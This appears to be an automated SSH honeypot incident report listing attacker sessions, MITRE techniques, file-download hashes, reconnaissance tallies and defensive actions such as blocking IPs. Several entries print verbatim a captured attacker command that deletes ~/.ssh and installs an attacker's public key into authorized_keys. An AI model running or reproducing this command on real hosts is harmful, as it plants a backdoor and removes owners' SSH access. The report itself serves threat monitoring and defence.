| `2026-06-07 15:16:54` | `cowrie.session.connect` |
| `2026-06-07 15:16:54` | `cowrie.client.version` |
| `2026-06-07 15:16:55` | `cowrie.client.kex` |
| `2026-06-07 15:16:55` | `cowrie.login.success` |
| `2026-06-07 15:16:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.205.57[.]72` to AbuseIPDB if not already reported
- [ ] Block `92.205.57[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-967db2e916bf

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-06-07 15:18 |
| **Last Seen** | 2026-06-07 15:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 15:18:38` | `cowrie.session.connect` |
| `2026-06-07 15:18:38` | `cowrie.client.version` |
| `2026-06-07 15:18:38` | `cowrie.client.kex` |
| `2026-06-07 15:18:39` | `cowrie.login.success` |
| `2026-06-07 15:18:39` | `cowrie.session.params` |
| `2026-06-07 15:18:39` | `cowrie.command.input` |
| `2026-06-07 15:18:39` | `cowrie.command.failed` |
| `2026-06-07 15:18:40` | `cowrie.log.closed` |
| `2026-06-07 15:18:40` | `cowrie.session.params` |
| `2026-06-07 15:18:40` | `cowrie.command.input` |
| `2026-06-07 15:18:40` | `cowrie.session.file_download` |
| `2026-06-07 15:18:40` | `cowrie.log.closed` |
| `2026-06-07 15:18:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8411f51ee581

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-06-07 15:18 |
| **Last Seen** | 2026-06-07 15:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 15:18:43` | `cowrie.session.connect` |
| `2026-06-07 15:18:43` | `cowrie.client.version` |
| `2026-06-07 15:18:43` | `cowrie.client.kex` |
| `2026-06-07 15:18:44` | `cowrie.login.success` |
| `2026-06-07 15:18:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7134192e251c

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-06-07 15:20 |
| **Last Seen** | 2026-06-07 15:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 15:20:39` | `cowrie.session.connect` |
| `2026-06-07 15:20:39` | `cowrie.client.version` |
| `2026-06-07 15:20:40` | `cowrie.client.kex` |
| `2026-06-07 15:20:40` | `cowrie.login.success` |
| `2026-06-07 15:20:41` | `cowrie.session.params` |
| `2026-06-07 15:20:41` | `cowrie.command.input` |
| `2026-06-07 15:20:41` | `cowrie.command.failed` |
| `2026-06-07 15:20:41` | `cowrie.log.closed` |
| `2026-06-07 15:20:42` | `cowrie.session.params` |
| `2026-06-07 15:20:42` | `cowrie.command.input` |
| `2026-06-07 15:20:42` | `cowrie.session.file_download` |
| `2026-06-07 15:20:42` | `cowrie.log.closed` |
| `2026-06-07 15:20:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cd33439bf66

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-06-07 15:20 |
| **Last Seen** | 2026-06-07 15:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 15:20:44` | `cowrie.session.connect` |
| `2026-06-07 15:20:44` | `cowrie.client.version` |
| `2026-06-07 15:20:45` | `cowrie.client.kex` |
| `2026-06-07 15:20:46` | `cowrie.login.success` |
| `2026-06-07 15:20:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-984bd3a91c16

| Field | Detail |
|---|---|
| **Source IP** | `14.103.233[.]27` |
| **First Seen** | 2026-06-07 15:22 |
| **Last Seen** | 2026-06-07 15:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 15:22:00` | `cowrie.session.connect` |
| `2026-06-07 15:22:00` | `cowrie.client.version` |
| `2026-06-07 15:22:00` | `cowrie.client.kex` |
| `2026-06-07 15:22:00` | `cowrie.login.success` |
| `2026-06-07 15:22:01` | `cowrie.session.params` |
| `2026-06-07 15:22:01` | `cowrie.command.input` |
| `2026-06-07 15:22:01` | `cowrie.command.failed` |
| `2026-06-07 15:22:01` | `cowrie.log.closed` |
| `2026-06-07 15:22:02` | `cowrie.session.params` |
| `2026-06-07 15:22:02` | `cowrie.command.input` |
| `2026-06-07 15:22:02` | `cowrie.session.file_download` |
| `2026-06-07 15:22:02` | `cowrie.log.closed` |
| `2026-06-07 15:22:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.233[.]27` to AbuseIPDB if not already reported
- [ ] Block `14.103.233[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5be02a3aaae

| Field | Detail |
|---|---|
| **Source IP** | `14.103.233[.]27` |
| **First Seen** | 2026-06-07 15:22 |
| **Last Seen** | 2026-06-07 15:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 15:22:08` | `cowrie.session.connect` |
| `2026-06-07 15:22:08` | `cowrie.client.version` |
| `2026-06-07 15:22:08` | `cowrie.client.kex` |
| `2026-06-07 15:22:09` | `cowrie.login.success` |
| `2026-06-07 15:22:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.233[.]27` to AbuseIPDB if not already reported
- [ ] Block `14.103.233[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02e1a684af6c

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-06-07 15:26 |
| **Last Seen** | 2026-06-07 15:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 15:26:35` | `cowrie.session.connect` |
| `2026-06-07 15:26:35` | `cowrie.client.version` |
| `2026-06-07 15:26:35` | `cowrie.client.kex` |
| `2026-06-07 15:26:36` | `cowrie.login.success` |
| `2026-06-07 15:26:36` | `cowrie.session.params` |
| `2026-06-07 15:26:36` | `cowrie.command.input` |
| `2026-06-07 15:26:36` | `cowrie.command.failed` |
| `2026-06-07 15:26:37` | `cowrie.log.closed` |
| `2026-06-07 15:26:37` | `cowrie.session.params` |
| `2026-06-07 15:26:37` | `cowrie.command.input` |
| `2026-06-07 15:26:37` | `cowrie.session.file_download` |
| `2026-06-07 15:26:37` | `cowrie.log.closed` |
| `2026-06-07 15:26:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a32877a61be3

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-06-07 15:26 |
| **Last Seen** | 2026-06-07 15:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 15:26:40` | `cowrie.session.connect` |
| `2026-06-07 15:26:40` | `cowrie.client.version` |
| `2026-06-07 15:26:40` | `cowrie.client.kex` |
| `2026-06-07 15:26:41` | `cowrie.login.success` |
| `2026-06-07 15:26:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6493e1fffc3e

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-06-07 15:28 |
| **Last Seen** | 2026-06-07 15:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 15:28:27` | `cowrie.session.connect` |
| `2026-06-07 15:28:27` | `cowrie.client.version` |
| `2026-06-07 15:28:27` | `cowrie.client.kex` |
| `2026-06-07 15:28:28` | `cowrie.login.success` |
| `2026-06-07 15:28:28` | `cowrie.session.params` |
| `2026-06-07 15:28:28` | `cowrie.command.input` |
| `2026-06-07 15:28:28` | `cowrie.command.failed` |
| `2026-06-07 15:28:29` | `cowrie.log.closed` |
| `2026-06-07 15:28:29` | `cowrie.session.params` |
| `2026-06-07 15:28:29` | `cowrie.command.input` |
| `2026-06-07 15:28:29` | `cowrie.session.file_download` |
| `2026-06-07 15:28:29` | `cowrie.log.closed` |
| `2026-06-07 15:28:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe122c73ffa3

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-06-07 15:28 |
| **Last Seen** | 2026-06-07 15:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 15:28:32` | `cowrie.session.connect` |
| `2026-06-07 15:28:32` | `cowrie.client.version` |
| `2026-06-07 15:28:32` | `cowrie.client.kex` |
| `2026-06-07 15:28:33` | `cowrie.login.success` |
| `2026-06-07 15:28:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3844589d5f2e

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-06-07 15:33 |
| **Last Seen** | 2026-06-07 15:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 15:33:38` | `cowrie.session.connect` |
| `2026-06-07 15:33:38` | `cowrie.client.version` |
| `2026-06-07 15:33:38` | `cowrie.client.kex` |
| `2026-06-07 15:33:39` | `cowrie.login.success` |
| `2026-06-07 15:33:40` | `cowrie.session.params` |
| `2026-06-07 15:33:40` | `cowrie.command.input` |
| `2026-06-07 15:33:40` | `cowrie.command.failed` |
| `2026-06-07 15:33:40` | `cowrie.log.closed` |
| `2026-06-07 15:33:40` | `cowrie.session.params` |
| `2026-06-07 15:33:40` | `cowrie.command.input` |
| `2026-06-07 15:33:40` | `cowrie.session.file_download` |
| `2026-06-07 15:33:40` | `cowrie.log.closed` |
| `2026-06-07 15:33:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22a6ce709952

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-06-07 15:33 |
| **Last Seen** | 2026-06-07 15:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 15:33:43` | `cowrie.session.connect` |
| `2026-06-07 15:33:43` | `cowrie.client.version` |
| `2026-06-07 15:33:43` | `cowrie.client.kex` |
| `2026-06-07 15:33:44` | `cowrie.login.success` |
| `2026-06-07 15:33:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f719830f2a81

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-06-07 15:35 |
| **Last Seen** | 2026-06-07 15:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 15:35:37` | `cowrie.session.connect` |
| `2026-06-07 15:35:37` | `cowrie.client.version` |
| `2026-06-07 15:35:37` | `cowrie.client.kex` |
| `2026-06-07 15:35:38` | `cowrie.login.success` |
| `2026-06-07 15:35:38` | `cowrie.session.params` |
| `2026-06-07 15:35:38` | `cowrie.command.input` |
| `2026-06-07 15:35:38` | `cowrie.command.failed` |
| `2026-06-07 15:35:39` | `cowrie.log.closed` |
| `2026-06-07 15:35:39` | `cowrie.session.params` |
| `2026-06-07 15:35:39` | `cowrie.command.input` |
| `2026-06-07 15:35:39` | `cowrie.session.file_download` |
| `2026-06-07 15:35:39` | `cowrie.log.closed` |
| `2026-06-07 15:35:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe6e37ee2d88

| Field | Detail |
|---|---|
| **Source IP** | `20.12.41[.]6` |
| **First Seen** | 2026-06-07 15:35 |
| **Last Seen** | 2026-06-07 15:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 15:35:42` | `cowrie.session.connect` |
| `2026-06-07 15:35:42` | `cowrie.client.version` |
| `2026-06-07 15:35:42` | `cowrie.client.kex` |
| `2026-06-07 15:35:43` | `cowrie.login.success` |
| `2026-06-07 15:35:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.12.41[.]6` to AbuseIPDB if not already reported
- [ ] Block `20.12.41[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dce3559c9fe9

| Field | Detail |
|---|---|
| **Source IP** | `14.103.233[.]27` |
| **First Seen** | 2026-06-07 15:36 |
| **Last Seen** | 2026-06-07 15:36 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 15:36:05` | `cowrie.session.connect` |
| `2026-06-07 15:36:06` | `cowrie.client.version` |
| `2026-06-07 15:36:06` | `cowrie.client.kex` |
| `2026-06-07 15:36:07` | `cowrie.login.success` |
| `2026-06-07 15:36:07` | `cowrie.session.params` |
| `2026-06-07 15:36:07` | `cowrie.command.input` |
| `2026-06-07 15:36:07` | `cowrie.command.failed` |
| `2026-06-07 15:36:07` | `cowrie.log.closed` |
| `2026-06-07 15:36:07` | `cowrie.session.params` |
| `2026-06-07 15:36:07` | `cowrie.command.input` |
| `2026-06-07 15:36:08` | `cowrie.session.file_download` |
| `2026-06-07 15:36:08` | `cowrie.log.closed` |
| `2026-06-07 15:36:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.233[.]27` to AbuseIPDB if not already reported
- [ ] Block `14.103.233[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a513580b525a

| Field | Detail |
|---|---|
| **Source IP** | `14.103.233[.]27` |
| **First Seen** | 2026-06-07 15:36 |
| **Last Seen** | 2026-06-07 15:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 15:36:14` | `cowrie.session.connect` |
| `2026-06-07 15:36:15` | `cowrie.client.version` |
| `2026-06-07 15:36:15` | `cowrie.client.kex` |
| `2026-06-07 15:36:15` | `cowrie.login.success` |
| `2026-06-07 15:36:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.233[.]27` to AbuseIPDB if not already reported
- [ ] Block `14.103.233[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `143.198.80[.]171` | **33** | 2026-06-07 14:00 | 2026-06-07 15:39 | 34m | 0 | `T1592` | 🟠 MEDIUM |
| `14.103.233[.]27` | **23** | 2026-06-07 14:52 | 2026-06-07 15:39 | 36m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `222.107.156[.]227` | **19** | 2026-06-07 14:02 | 2026-06-07 14:37 | 0m | 19 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `20.244.18[.]126` | **17** | 2026-06-07 14:02 | 2026-06-07 14:36 | 0m | 17 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `217.154.180[.]67` | **17** | 2026-06-07 14:01 | 2026-06-07 15:30 | 0m | 17 | `T1110.001 · T1592` | 🟠 MEDIUM |
